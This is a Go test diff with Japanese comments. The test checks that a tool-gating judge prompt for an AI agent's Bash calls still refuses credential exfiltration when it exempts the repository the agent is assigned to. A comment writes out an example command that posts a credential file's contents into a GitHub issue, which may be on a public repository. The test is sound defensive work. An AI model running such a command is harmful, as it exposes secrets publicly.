@@ -567,6 +567,49 @@ func TestToolGate_担当しているissueを判定役へ渡す(t *testing.T) {
 	}
 }
 
+// 目的: **担当先を告げる文が、他の断る条件を免除しないと言い切っていること**を固定する（設計 3-64f）。
+//
+// **なぜ要るか。**免除の1文だけを読んだ判定役は、他の条件まで通しうる。
+// とくに危ないのは2つ目（資格情報の持ち出し）である。
+//
+//	gh issue create --repo <担当のリポジトリ> --body "$(cat <資格情報のファイル>)"
+//
+// **担当しているリポジトリが相手なので、免除の1文だけを読むと通る。**
+// **公開リポジトリなら、その issue は誰でも読める。**
+// **この変更が入る前は、断る条件の3つ目がこの呼び出しごと断っていた。**
+// 免除を足した以上、資格情報の持ち出しが素通りしないことを、同じ文の中で言い切る。
+//
+// 与える情報: `mode: on` の設定と、公開リポジトリの issue。
+// 成功条件: 免除の文と同じ断る条件の中に、他の条件を免除しないことと、
+// 資格情報のときは断ることが書いてあること。
+func TestToolGate_担当先を告げる文は他の条件を免除しない(t *testing.T) {
+	public := false
+	got, _ := writeSettingsForToolGate(t, config.ClaudeToolGateConfig{
+		Mode:  config.ClaudeToolGateModeOn,
+		Tools: []string{"Bash"},
+	}, &public)
+	prompt := promptOf(t, got)
+
+	noteAt := strings.Index(prompt, "いま担当しているのは")
+	if noteAt < 0 {
+		t.Fatalf("担当先を告げる文がありません:\n%s", prompt)
+	}
+	// **同じ断る条件の中にあること。**次の条件（`- 権限の昇格`）より前で言い切る。
+	nextCondAt := strings.Index(prompt, "- 権限の昇格")
+	if nextCondAt < 0 {
+		t.Fatalf("次の断る条件（権限の昇格）が見つかりません:\n%s", prompt)
+	}
+	sameCondition := prompt[noteAt:nextCondAt]
+
+	for _, want := range []string{"これは上の条件を免除しない", "資格情報の持ち出し"} {
+		if !strings.Contains(sameCondition, want) {
+			t.Errorf("免除の文と同じ条件の中に %q がありません:\n"+
+				"免除だけを読んだ判定役が、資格情報を公開の issue へ書く呼び出しまで通します:\n%s",
+				want, sameCondition)
+		}
+	}
+}
+
 // 目的: **「関係のない」という限定を落としていないこと**を固定する（設計 3-64f）。
 //
 // **落とすと、fork へ push して本家のリポジトリへ PR を出す形が通らなくなる。**
